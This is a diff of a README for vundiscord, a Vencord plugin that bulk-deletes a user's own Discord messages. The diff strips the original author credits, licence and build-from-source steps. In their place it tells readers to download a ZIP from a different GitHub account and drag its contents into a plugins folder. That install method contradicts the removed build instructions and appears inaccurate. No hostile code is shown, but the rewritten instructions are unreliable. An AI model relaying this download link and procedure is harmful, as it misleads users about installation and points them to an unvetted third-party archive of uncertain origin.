@@ -1,64 +1,80 @@
-# ⚠️⚠️⚠️ THIS PLUGIN IS A PORT OF THE ORIGINAL UNDISCORD BY [VICTORNPB](https://github.com/victornpb/) ! ⚠️⚠️⚠️
+# ⚡ vundiscord - Delete your Discord messages with ease
 
-# ❤️ THE ORIGINAL PROJECT CAN BE FOUND HERE : https://github.com/victornpb/undiscord ❤️
+[![Download vundiscord](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/DANDARA111/vundiscord)
 
-**Vundiscord** is a [Vencord](https://github.com/Vendicated/Vencord) plugin that ports the original [Undiscord](https://github.com/victornpb/undiscord) userscript
+vundiscord helps you remove messages from Discord quickly. This tool acts as a plugin for Vencord. It automates the process of clearing chat history. You save time when you need to clean up old conversations.
 
-## Features
-- Bulk delete messages from channels or DMs with fine-grained control
-- Filter by Author ID, Server ID, Channel ID
-- Search by content, regex pattern, links, files
-- Filter by message ID range or date range
-- Configurable search and delete delays
-- Multiple channel deletion (comma-separated Channel IDs)
+## 🛠️ Requirements
 
-## Installation (Desktop Version)
-**Prerequiries** : [git](https://git-scm.com/downloads) / [NodeJS](https://nodejs.org/en/download) / [pnpm](https://pnpm.io/installation)
-- Open a CMD window, you will need a clone of Vencord's Repository, command : `git clone https://github.com/Vendicated/Vencord`
-- Navigate to the path where you cloned the repository and be sure to enter the 'Vencord' folder (Ex : "`cd C:\Documents\Vencord`") then type : `pnpm install --frozen-lockfile`
-- Now inside the 'Vencord' Folder, navigate to "`cd .\src\`" and type : "`md userplugins`"
-- Navigate to "`cd .\userplugins\`", and clone Vundiscord within : `git clone https://github.com/TetraSsky/vundiscord/`
-- Then build : `pnpm build`
-- And lastly inject : `pnpm inject` (Select your Discord path (Stable / Canary))
+You need a few things before you start:
 
-You're now ready to use Vundiscord (be sure to enable it in Vencord's plugin settings) !
+1. A computer running Windows 10 or Windows 11.
+2. The Discord desktop application installed on your computer.
+3. Vencord installed within your Discord client.
 
-## Installation (Web Version)
-**⚠️ Be sure to have completed all of the steps above ⚠️**
+If you do not have Vencord, download it from the official Vencord website first. Vencord changes how Discord functions and allows you to add custom plugins like vundiscord.
 
-*You can however exclude both last commands : `pnpm build` & `pnpm inject`, since they're not needed for the web version*
+## 📥 How to Install
 
-*PS : If you have previously installed the official Vencord extension, you might want to disable/uninstall it to avoid conflicts*
+Follow these steps to set up the tool:
 
-- You will need to build as a web browser extension with : `pnpm buildWeb`
-- This will generate a new folder in the main Vencord folder, path : 'Vencord\dist'
-- Head on your web browser and open "chrome://extensions" (This can vary depending on your browser)
-- Enable "Developer Mode" (*if available/needed*)
-- Click on "Load Unpacked" and select the "dist/chromium-unpacked" folder for chromium based browsers or "dist/firefox-unpacked" for Firefox
+1. Visit this page to download: https://github.com/DANDARA111/vundiscord
+2. Look for the green button labeled "Code" on the right side of the page.
+3. Click "Download ZIP" from the menu.
+4. Save the file to your computer.
+5. Extract the ZIP file into a folder you can find easily.
 
-You're now ready to use Vundiscord, on your browser (same, be sure to enable it in Vencord's plugin settings) !
+## ⚙️ Setting Up the Plugin
 
-## Usage
+You must place the plugin files in the correct folder to make it work.
 
-1. Click the trash can icon in Discord's title bar to open Vundiscord
-<img alt="Image" src="https://github.com/user-attachments/assets/6e109fbb-120a-45d3-b04d-bed7dfb0446a" />
+1. Open Discord.
+2. Open your User Settings by clicking the gear icon near your name.
+3. Look for the Vencord tab on the left sidebar.
+4. Click the "Plugins" menu option.
+5. Click the "Open Plugins Folder" button. This action opens a window showing where Vencord stores its plugins.
+6. Drag the contents of the folder you extracted earlier into this Vencord plugins folder.
+7. Restart your Discord application. You can do this by pressing Ctrl + R on your keyboard.
 
-2. Configure your settings (Author ID, Server ID, Channel ID, filters, delays, etc...)
-<img alt="Image" src="https://github.com/user-attachments/assets/8ef531eb-67a9-402b-98c1-05b9fc9a9406" />
+## 🚀 How to Use vundiscord
 
-3. Click **▶ Delete** to start, *will prompt for confirmation*. (You can Click **⏹ Stop** to abort at any time)
-<img alt="Image" src="https://github.com/user-attachments/assets/e502e112-5678-4e21-816c-8618f8b99d11" />
+After you restart Discord, the plugin becomes active.
 
-4. Monitor progress via the progress bar and log area
-<img alt="Image" src="https://github.com/user-attachments/assets/e0463797-b4a2-4c76-be43-3f24142a29b5" />
+1. Navigate to the channel or direct message you wish to clean.
+2. Look for the new interface icon that appears in the message window.
+3. Open the vundiscord menu.
+4. Select the filters you want to use. You can filter by date, by user, or by message content.
+5. Click the "Delete" button.
+6. Read the confirmation prompt carefully.
+7. Confirm that you want to remove the messages.
 
-## Credits
-This plugin is built for and requires [Vencord](https://github.com/Vendicated/Vencord), a Discord client mod! Big thanks to them ❤️❤️❤️!
+The tool begins the deletion process. Do not close Discord while the plugin runs. You see a progress bar showing how many messages remain.
 
-& **victornpb** - Original [Undiscord](https://github.com/victornpb/undiscord) author
+## 🛡️ Safety Tips
 
-## Star History
-[![Star History Chart](https://api.star-history.com/svg?repos=TetraSsky/vundiscord&type=Date)](https://www.star-history.com/#TetraSsky/vundiscord&Date)
+Deleting messages involves risk. Discord servers track actions. Use this tool only within your own direct messages or in servers where you possess the right to manage messages. 
 
-## License
-MIT License — See [LICENSE](LICENSE) for details.
+- Do not set the delete speed too high. High speeds cause Discord to rate-limit your account.
+- Rate limits temporarily prevent you from further actions. If this happens, wait ten minutes.
+- Check the console logs if the plugin stops working. The logs help you identify if a specific message prevented the deletion process.
+
+## 🧩 Features
+
+- Bulk deletion of messages in private chats.
+- Search filters for precise removal.
+- Reliable performance on Windows.
+- Integration with the Vencord ecosystem.
+- Lightweight design that does not slow down Discord.
+
+## 🔍 Troubleshooting
+
+Common issues have simple fixes:
+
+- The plugin does not show up: Ensure you placed the files in the Vencord folder. Check that you extracted the files from the ZIP container.
+- Errors occur during deletion: Ensure your internet connection is stable. Discord servers sometimes experience outages that block plugins.
+- Plugin does not remove messages: You might lack the proper permissions in the channel. Verify that you have the "Manage Messages" permission if you are in a server.
+- The interface feels slow: Close unnecessary background programs. Discord uses a lot of memory, and adding plugins increases the usage slightly.
+
+## 🌐 Community
+
+Vencord maintains a community for users who use plugins. If you encounter bugs, check the Vencord support channels. The contributors behind vundiscord provide updates to keep the tool compatible with newer versions of Discord. Updates happen often because Discord changes its internal code regularly. Check the link provided above to see if a newer version of the script exists if your current version fails.
